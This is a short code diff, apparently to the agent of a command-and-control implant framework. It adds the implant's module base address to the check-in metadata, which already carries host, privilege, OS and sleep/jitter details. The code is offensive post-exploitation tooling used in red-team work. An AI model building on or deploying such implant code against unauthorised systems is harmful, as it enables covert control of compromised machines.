@@ -146,6 +146,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         [ Parent  PID  ] 4 bytes
         [ Process Arch ] 4 bytes
         [ Elevated     ] 4 bytes
+        [ Base Address ] 8 bytes
         [ OS Info      ] ( 5 * 4 ) bytes
         [ OS Arch      ] 4 bytes
         [ SleepDelay   ] 4 bytes
@@ -240,6 +241,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PackageAddInt32( *MetaData, Instance.Session.PPID );
     PackageAddInt32( *MetaData, PROCESS_AGENT_ARCH );
     PackageAddInt32( *MetaData, BeaconIsAdmin( ) );
+    PackageAddInt64( *MetaData, Instance.Session.ModuleBase );
 
     MemSet( &OsVersions, 0, sizeof( OsVersions ) );
     OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
@@ -251,6 +253,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PackageAddInt32( *MetaData, OsVersions.dwBuildNumber );
 
     PackageAddInt32( *MetaData, Instance.Session.OS_Arch );
+
 
     PackageAddInt32( *MetaData, Instance.Config.Sleeping );
     PackageAddInt32( *MetaData, Instance.Config.Jitter );
